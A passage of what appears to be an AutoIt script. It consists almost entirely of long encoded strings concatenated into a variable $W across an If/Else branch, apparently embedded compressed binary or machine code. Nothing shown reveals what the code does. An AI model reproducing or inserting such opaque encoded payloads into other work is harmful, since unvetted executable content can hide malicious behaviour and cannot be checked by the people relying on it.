			$W &= "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"
			$W &= "8QSYREonCEHs2veBgH/NUA4X4BeR9i+IX3YRTdaNB2BD77Coh1HMqtRUQH/klgTfiKmeEdG14wIZTGqIGy+hwSwfuBBKRmUiUX8EDZ1e6gRALQGMNV2I5foRh3RzAnr7C0EuIJ+zZx1EWpMIktvSUoHJ6RBWMxCcbdYiRxME75rXYYxAoDehDHqI4FkR+BSOAjvrEzyJIE3OqSdE7q4It2HJNYEq4Rzl7RD1ekcisTwEsJzS31lAyFXycz+I6xgRFM55P7sIxze/gTxT983qEINf/SKqW/7fET1vFAKZeETbhiBhyq/zRIEXCLloxD6BKzgkNCwQBMKjIkBfBH4WHcNyQLq84iUMiHcoETxJiwLW/w2VQSAmOagBRHHhCAgMs96Badi05JwQFGRWIsGQBGN7y4RhQFXVMrZwiCFIEWxcdAIM0LhXQiR9qcfSpw9fdVend0rd5yt0D6nv152POafXnb95z9PdZ23f151/LnUP92dLnX8qdSf3v0udFz1n0qc/XnTP929K3Yc9n9fdt3mv152neQ/T3Z8qdDf3H0ud9z3f150Xaf/W3e8rdafn5150f6ln1t3veW/T3bcudM+t39bdz22P1t13aQ/W3QdpN9adh3mH0rfPS91PK3QXvQfXnb95T9bdfyt1b7fvS90XbQfW3Wd9v9bdR2l31t0naUfS939L3Wd9H9L3J191/+ePSp2vKnXf58dedQ+390rdPy90n7kX1t3fKnXv999L3VcqdRfnD0qdn31P0rdPS52HKnRXvafTp6dGAVt0p61v193vKnQn6RfX3d8udGe9r9Knl0vdFy50N6lX0ueHS91/eU/S5wdO3Sc6dYe330udb3nf06f3X3Vv9zdO3Z8rdd/3f07d1yp096mv153/eV/St5dO3d8rdJ+pZ9LnH0+dLy91X+f/Tt2vKnU/589LnQc6dN+tP9KnR0rd/yt0J+3v193vL3SH6e/S94dK3UcqdJ+px9On9190f+nX0+dXTt23OnT/7b/SpzdOnc8+df/3r0/dFz50T63/0qenTp1XO3TP6afTt19Ond8rdMetD9K3P0rdby90t7k/07cfT50PLnTX+d/T939K3d8vdO/tx9LnL0rdryt0x+mf06fvS91vPnRv+a/T589O3Zc+dIfpd9P3t0+dfz50n+lf9OkH07cPTt0/LnTn6TfS5x9O3dcrdCep99P3f0ud7zt0b/3X1qdfWp0XO3T3+c/Tpw9Pnc87dPe9N9Onh07dfyt0X72/0/dvSt1nO3T3/V/T5+9K3a8udL/tT9a3N1qdFzt0T72n1refT91nanSnucfS569Onf9rdN+5f9PnF07d72t0Z7gHLkAj5QIyewhOw04gYtOAbqtwNq0BRliO1nniUZGqW4pFWWZbijkpMGuVZ+7SVqLiHZKFxrgRosm6nlgytZT9ska1lPGU4i1l5S1k3bWc1Vv9jsktNse9FszjsYvlcaXF2LiZ4gTcjXHDbjiBBbccdVsSjmkt68ddFnXjUYsscUXFbrg54lLcLXGzbjghL7ccFVvRjgktIGf9Fluz8Yu+WeXFTKzZ4tDWzXH7azjBM7WctVr5zqktUGedFqizkYtAWYXFnax54rzWbXEhazhh87WcVVoMzkktX2c9FhezMYt+WSXFXawZ4mDWDXHcazgBkLUc9Vrujukt3kfdFtuj0Ys6UcXFBqi54sLUrXFiajih5LUclVrIjoktjUd9FqmjcYv0UWXFeqhZ4rrUTXEuajhBtLUcNVrdjiktS0cdFoqjEYu1UQXEA/z54mF+7XG5PzjhHZ+c1U/4zsknaee9E5TzsYmH+aXEVfyZ4ox+jXENPziBQp+cdU+ZzmknsOddFxY2BwA="
		Else
			Local $W = "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"
			$W &= "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"
			$W &= "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"
			$W &= "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"
			$W &= "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"
			$W &= "fV0ABAbUb2BQFf8AGZj7JNa96ZcAiUBDzGfZnncfsOhCnwdAi4jnGVs4AHnI7tuhfApH5kICD+n4hB7JEAmAA4aDMivtSPARcKwAbFpyTv0O//sAD4U4Vj2u1R4HNi05JwrQ2WRoXACmIZtbVNEkNgAuOgwKZ7GTVwDnD7TultIbmwCRnoDAxU9h3AAgolp3S2kcEgAaFuKTugrAoAMq5Twi4EP4GxcdAA4JDQvyi8etAC22qLkUHqnIAFfxGYWvdQdMAO6Z3bujf2D9APcBJp9ccvW8AERmO8Vb+340AItDKXbLI8bcALbt/Gi45PFjPdcxncpCgIUQE5ciQA+ExhEgQEokfdK7Bz34rvky0McpoW0AHZ4vS9yyMPMADYZS7HfB49AAK7MWbKlwuZkAEZRI+kfpZCIAqPyMxKDwPxoPVn0s2KAzkO+HSQBOx9k40cGMygCi/pjUCzam9QCBz6V63ijatwCOJj+tv6QsOgCd5FB4kg1qXwDMm1R+RmL2jQATwpDYuOguOZjCAILDr/WfXYC+AGnQk3xv1S2pAM8lErPIrJk7ABAYfafonGNuetsDu3vNJngJyFkY9APsmrcBg0+oqOaV/GU7qv8AfiG8zwjvFX/oALrnm9lKbzbOAOqfCdQpsHzWATGksq8qPyPcxqUAlDA1ombAdE4AvDf8gsqm4JAA0LAzp9gV8QQAmEpB7Nr3f80AUA4XkfYvdk0H1o1D77BjzKrIVOSWAATfntG140xqAIgbwSwfuEZlAFF/nV7qBAGMADVd+od0c/sLAEEus2cdWpLbANJS6RBWM23WAEcTmtdhjDehAQx6WfgUjuv4PIkAzqkn7rdhyTUA4Rzl7XpHsTwAnNLfWVXycz8OGBTOecDHN79T9wDN6l/9qlvfPQBvFHhE24bKrwDzgbloxD44JAA0LMKjQF8WHQDDcrziJQwoPABJi/8NlUE5qB8BcQiAs97YtOScAGRWwZB7y4RhFtUytgA3bFx00LgXV0JQSAFTkcMilkTL8Yu0SJORVSL2RJElifwXGJGAIo9ESWeJmBLhJAJIEpGjIsZE55WJ6xLaJC1I05EpIkREaniJaxLdJLZIF5FmIrREGIKJYBJFJOBIhJEcIpREWBmJhxK3JCNI4pFXIipEBwOJmhKlJPJIspG6IlxEK5KJ8BKhJM1I1ZEfIopEnaCJMhJ1JDlIqpEGIlFE+T2JrhJGJLVeYkRv/4kkEpckzEh3vUSIiTgS2yRHSOmRyXCJgxJIJKxITpH7Ilb/EickZEghkdEiOkSxD4nSEp4kT0iikWkiFkQK5YlDEh0kC0itkbkiyESFTIm7Ev0kn0i8kcUiNER23IloEmMkykgQkUAiIER9+IvMSG2RSyLzROzQiWwSmST6SCKRxCIaRNjviccSwST+SDaRzyIoRCakieQSDSSbSGKRwiLoRF71ib4SfCSpSLOROyKnRG57iQkS9CQBSKiRZSJ+RQjuJNlIzpHUItZFr84kMEjAkTcipkSwFYlKEvckDkgvkY1yiVQS3yTjSBuRuCJ/RARdiXMSLiRaSFKRMyITRIx6iY4SiSTuSDWR7X2JWRI/JHlIv5HqIlv9EoYkgUg+kSwiX0R